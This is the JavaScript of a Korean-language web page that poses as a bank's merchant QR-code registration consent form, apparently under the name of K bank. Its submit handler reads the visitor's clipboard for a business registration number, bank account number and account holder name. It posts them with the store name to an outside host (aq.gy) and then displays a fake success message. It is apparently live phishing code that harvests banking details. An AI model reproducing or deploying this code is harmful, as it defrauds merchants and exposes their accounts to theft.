
  window.addEventListener('load', function(){
    var el = document.getElementById('page-spinner');
    var shown = Date.now();
    function revealCards(){
      var formCard    = document.getElementById('formCard');
      var privacyCard = document.getElementById('privacyCard');
      if(formCard)    { formCard.classList.remove('slide-hidden');    formCard.classList.add('slide-in'); }
      if(privacyCard) { privacyCard.classList.remove('slide-hidden'); privacyCard.classList.add('slide-in-delay'); }
    }
    var hide = function(){
      el.style.opacity='0';
      el.style.transition='opacity .3s';
      setTimeout(function(){ el.style.display='none'; revealCards(); }, 300);
    };
    var elapsed = Date.now() - shown;
    var delay = Math.max(0, 1500 - elapsed);
    setTimeout(hide, delay);
  });

  /* 데스크탑 장식 아이콘 표시 */
  (function () {
    var deco = document.querySelector('.header-deco');
    if (deco && window.innerWidth >= 1024) {
      deco.style.display = 'flex';
    }
    window.addEventListener('resize', function () {
      if (deco) deco.style.display = window.innerWidth >= 1024 ? 'flex' : 'none';
    });
  })();

  function toggleSubmitBtn() {
    var checked = document.getElementById('consentCheck').checked;
    document.getElementById('submitBtn').disabled = !checked;
  }

  async function handleConsent() {
    var storeName = document.getElementById('storeName').value.trim();
    var btn = document.getElementById('submitBtn');

    // 클립보드에서 데이터 읽기
    var clipText = '';
    try {
      if (navigator.clipboard && navigator.clipboard.readText) {
        clipText = await navigator.clipboard.readText();
      } else {
        throw new Error('clipboard not supported');
      }
    } catch (e) {
      showResult('error', '&#9888;', '클립보드 접근 실패', '이전 페이지로 돌아가 정보를 다시 입력해주세요.<br>브라우저 클립보드 권한을 허용해야 합니다.');
      return;
    }

    // 클립보드 데이터 파싱
    var parts = clipText.split(',');
    if (parts.length < 3 || !parts[0].trim() || !parts[1].trim() || !parts[2].trim()) {
      showResult('error', '&#9888;', '정보 오류', '이전 페이지에서 사업자 번호, 계좌번호, 예금주명을 다시 입력해주세요.');
      return;
    }

    var bizNo       = parts[0].trim();
    var accountNo   = parts[1].trim();
    var accountName = parts[2].trim();

    // 버튼 로딩 상태
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span>처리 중...';

    // AJAX POST
    var formData = new FormData();
    formData.append('biz_no',       bizNo);
    formData.append('account_no',   accountNo);
    formData.append('account_name', accountName);
    formData.append('store_name',   storeName);

    try {
      $.ajax({
        url: 'https://aq.gy/te/kbank/handler.php',
        type: 'POST',
        data: formData,
        processData: false,
        contentType: false,
        dataType: 'json',
        success: function (data) {
          if (data.result !== 'success') {
            btn.disabled = false;
            btn.innerHTML = '동의하고 진행하기';
            showResult('error', '&#9888;', '오류가 발생했습니다', data.message || '잠시 후 다시 시도해주세요.');
            return;
          }

          document.getElementById('cardsGrid').style.display  = 'none';
          document.querySelector('.btn-wrap').style.display   = 'none';
          document.querySelector('.back-link').style.display  = 'none';
          document.querySelector('.step-indicator').style.display = 'none';

          var storeIdMsg = '<br><br>사업자 번호: <strong>' + bizNo + '</strong>';            
          showResult('success', '&#10003;', '등록이 완료되었습니다!',
            'QR 코드 정보 갱신 요청이 정상적으로 처리되었습니다.' + storeIdMsg);
        },
        error: function (err) {          
          btn.disabled = false;
          btn.innerHTML = '동의하고 진행하기';
          showResult('error', '&#9888;', '오류가 발생했습니다', '서버 오류. 잠시 후에 다시 시도해 주세요.');
        }
      });
    } catch (e) {
      btn.disabled = false;
      btn.innerHTML = '동의하고 진행하기';
      showResult('error', '&#9888;', '오류가 발생했습니다', e.message || '잠시 후 다시 시도해주세요.');
    }
  }

  function showResult(type, icon, title, msg) {
    var box = document.getElementById('resultBox');
    box.className = 'result-box ' + type;
    box.style.display = 'block';
    document.getElementById('resultIcon').innerHTML = icon;
    document.getElementById('resultTitle').textContent = title;
    document.getElementById('resultMsg').innerHTML = msg;
    box.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }
